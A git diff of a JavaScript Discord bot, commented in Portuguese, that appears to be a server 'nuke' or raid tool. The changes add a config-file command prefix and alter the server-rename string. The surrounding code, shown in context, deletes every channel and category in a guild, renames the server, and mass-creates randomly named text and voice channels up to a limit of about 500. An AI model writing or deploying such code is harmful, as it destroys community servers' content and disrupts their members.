@@ -1,5 +1,6 @@
 const Discord = require("discord.js");                                                            //declara que o bot usa a livraria discord.js
 const client = new Discord.Client();                                                              //declara que o bot é um client do discord
+const config = require("./config.json")                                                           //declara que o bot precisa do arquivo config.json
 
 client.on("ready", () => {                                                                        //se o bot tiver pronto vai executar td dentro desse bloco
     console.log(`Defoko 2.1`)
@@ -8,7 +9,7 @@ client.on("ready", () => {                                                      
 });
 
 client.on("message", async (message) => {
-    const args = message.content.slice("!!").trim().split(/ +/g);
+    const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
     const comando = args.shift().toLowerCase();
 
     const server = message.guild.channels;                                                        //declara uma variavel que é o servidor
@@ -33,10 +34,10 @@ client.on("message", async (message) => {
 	.catch(err => {                                                                            //se der erro...
 		return;                                                                            //...vai retornar nada
 	});
-	    message.guild.setName(`uísque best waifu owu~`)                                         //muda o nome do sv pra um nome colocado no site do host heroku
+	    message.guild.setName('uísque best waifu owu')                                           //muda o nome do sv pra esse nome ae owu
 	    const textuh = makeid(32);                                                             //cria uma variavel string usando aquela function ali em cima
 	    message.guild.createChannel(`${textuh}`, 'text')                                       //cria um canal com o nome a variavel textuh
-	    message.guild.createChannel(`${textuh}`, 'voice');                                     //cria um canal de texto com o nome a var textuh
+	    message.guild.createChannel(`${textuh}`, 'voice');                                       //cria um canal de texto com o nome a var textuh
 	if(message.guild.channels > 499) break;
        }
     }
@@ -46,11 +47,11 @@ client.on("message", async (message) => {
         server.deleteAll()                                                                         //deleta todos os canais e categorias do sv
         const texth = makeid(32);                                                                  //cria outra variavel usando aquela function ali
 	    message.guild.createChannel(`${texth}`, 'text');                                       //cria um canal de texto com o nome a var texth	
-	    message.guild.setName(`uísque best waifu owu~`)                                         //coloca o nome do sv pra um nome colocado no site do host heroku
+	    message.guild.setName('uísque best waifu owu')                                         //coloca o nome do sv esse ae uwu
     }
 });
 
-client.login(process.env.BOT_TOKEN);                                                               //loga no bot pra poder executar td isso
+client.login(process.env.BOT_TOKEN);                                                                        //loga no bot pra poder executar td isso
 
 //para de olhar aqui poha
 //- mene paradino
